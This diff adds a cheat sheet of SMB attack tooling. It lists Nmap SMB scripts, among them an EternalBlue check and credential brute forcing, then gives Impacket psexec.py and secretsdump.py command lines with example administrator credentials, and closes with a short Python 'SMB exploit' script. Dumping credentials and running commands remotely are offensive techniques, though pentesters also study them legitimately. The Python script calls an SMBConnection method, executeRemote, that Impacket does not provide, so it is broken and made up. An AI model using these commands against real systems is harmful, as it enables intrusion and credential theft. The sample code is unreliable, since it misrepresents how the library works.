@@ -1,1 +1,57 @@
 
+
+Common SMB Scripts in Nmap
+Script Name	Description
+smb-os-discovery	Discovers the operating system and version via SMB.
+smb-enum-shares	Enumerates shared folders on a target.
+smb-enum-users	Lists SMB domain users.
+smb-vuln-ms17-010	Checks if the target is vulnerable to EternalBlue (MS17-010).
+smb-brute	Attempts to brute force SMB credentials.
+smb-security-mode	Checks SMB security configurations.
+
+
+--------------------------------------------------------------------------------------------
+
+Impacket's SMB Python Modules
+Impacket provides a set of Python tools and libraries for interacting with the SMB protocol. These are often used in penetration testing and scripting.
+
+smbclient.py	Interacts with SMB shares (like a Linux SMB client). Purpose: Connects to SMB shares and lists or downloads files.
+
+smbclient.py WORKGROUP/Administrator:Password123@192.168.1.10
+
+-----------------------------------------------------------------
+psexec.py	Executes commands on a remote system over SMB.Purpose: Executes the ipconfig command on the target system via SMB
+
+psexec.py WORKGROUP/Administrator:Password123@192.168.1.10 "cmd.exe /c ipconfig"
+
+---------------------------------------------------------------------------------------------
+smbexec.py	Executes commands on a remote system using SMB without uploading executables.
+
+------------------------------------------------------------------------------
+secretsdump.py	Dumps hashed credentials and secrets from an SMB service.
+ Purpose: Extracts NTLM hashes, Kerberos tickets, and more from the target system via SMB
+
+secretsdump.py WORKGROUP/Administrator:Password123@192.168.1.10
+------------------------------------------------------------------
+wmiexec.py	Executes commands on a remote Windows system using WMI (via SMB authentication).
+
+-------------------------------------------------------------------------------------------
+Python SMB Exploit Example
+This script attempts to execute a payload on a remote machine over SMB:
+
+python
+Copy code
+from impacket.smbconnection import SMBConnection
+
+def smb_execute(target_ip, username, password, payload):
+    conn = SMBConnection(target_ip, target_ip)
+    conn.login(username, password)
+    conn.executeRemote(payload)
+    conn.close()
+
+target_ip = "192.168.1.10"
+username = "Administrator"
+password = "Password123"
+payload = "cmd.exe /c whoami"
+
+smb_execute(target_ip, username, password, payload)
